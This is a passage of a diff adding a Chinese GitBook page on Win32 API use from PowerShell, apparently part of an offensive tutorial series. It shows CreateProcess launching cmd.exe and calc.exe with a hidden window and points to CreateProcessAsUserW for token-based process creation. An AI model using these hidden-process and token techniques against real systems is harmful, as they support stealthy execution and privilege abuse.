+<span class="hljs-comment"># SECURITY_ATTRIBUTES Struct (Process &amp;amp; Thread)</span>
+<span class="hljs-variable">$SecAttr</span> = <span class="hljs-built_in">New-Object</span> SECURITY_ATTRIBUTES
+<span class="hljs-variable">$SecAttr</span>.Length = [System.Runtime.InteropServices.Marshal]::SizeOf(<span class="hljs-variable">$SecAttr</span>)
+
+<span class="hljs-comment"># CreateProcess In CurrentDirectory</span>
+<span class="hljs-variable">$GetCurrentPath</span> = (<span class="hljs-built_in">Get-Item</span> -Path <span class="hljs-string">&quot;.\&quot;</span> -Verbose).FullName
+
+<span class="hljs-comment"># Call CreateProcess</span>
+[Kernel32]::CreateProcess(<span class="hljs-string">&quot;C:\Windows\System32\cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c calc.exe&quot;</span>, [ref] <span class="hljs-variable">$SecAttr</span>, [ref] <span class="hljs-variable">$SecAttr</span>, <span class="hljs-literal">$false</span>,
+<span class="hljs-number">0</span>x08000000, [IntPtr]::Zero, <span class="hljs-variable">$GetCurrentPath</span>, [ref] <span class="hljs-variable">$StartupInfo</span>, [ref] <span class="hljs-variable">$ProcessInfo</span>) |<span class="hljs-built_in">out-null</span>
+</code></pre>
+<p>&#x5176;&#x4E2D;&#x7A97;&#x53E3;&#x95EE;&#x9898;&#x662F;&#x5728;<code>$StartupInfo.wShowWindow = 0x0000 # SW_HIDE</code>&#x8FD9;&#x91CC;&#x89E3;&#x51B3;&#x7684;&#xFF0C;&#x4E0B;&#x9762;&#x662F;&#x6D4B;&#x8BD5;&#x6548;&#x679C;&#xFF1A;</p>
+<p><img src="https://raw.githubusercontent.com/myoss114/oss/master/uPic/win32api/3.png" alt=""></p>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x8BA1;&#x7B97;&#x5668;&#x662F;&#x5728;cmd&#x8FDB;&#x7A0B;&#x4E0B;&#x9762;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x9700;&#x6C42;&#x662F;&#x4F7F;&#x7528;&#x4EC0;&#x4E48;Token&#x6765;&#x6253;&#x5F00;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#xFF0C;&#x6211;&#x4EEC;&#x4F7F;&#x7528;API&#xFF1A;CreateProcessAsUserW&#x90A3;&#x4E48;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x53BB;&#x7814;&#x7A76;&#x4E00;&#x4E0B;&#x5982;&#x4F55;&#x5B8C;&#x6210;&#x4F7F;&#x7528;&#x7279;&#x5B9A;token&#x6253;&#x5F00;&#x8FDB;&#x7A0B;&#x3002;</p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="7. WMI对象操作.html" class="navigation navigation-prev " aria-label="Previous page: WMI&dot-net对象操作">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="9. Dll注入&shellcode注入&exe注入.html" class="navigation navigation-next " aria-label="Next page: 注入操作">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"Win32API","level":"1.3.2","depth":2,"next":{"title":"注入操作","level":"1.3.3","depth":2,"path":"9. Dll注入&shellcode注入&exe注入.md","ref":"9. Dll注入&shellcode注入&exe注入.md","articles":[]},"previous":{"title":"WMI&dot-net对象操作","level":"1.3.1","depth":2,"path":"7. WMI对象操作.md","ref":"7. WMI对象操作.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"8. Win32API.md","mtime":"2020-04-13T09:48:14.584Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-04-13T09:56:21.455Z"},"basePath":".","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="gitbook/gitbook.js"></script>
+    <script src="gitbook/theme.js"></script>
+    
+        
+        <script src="gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
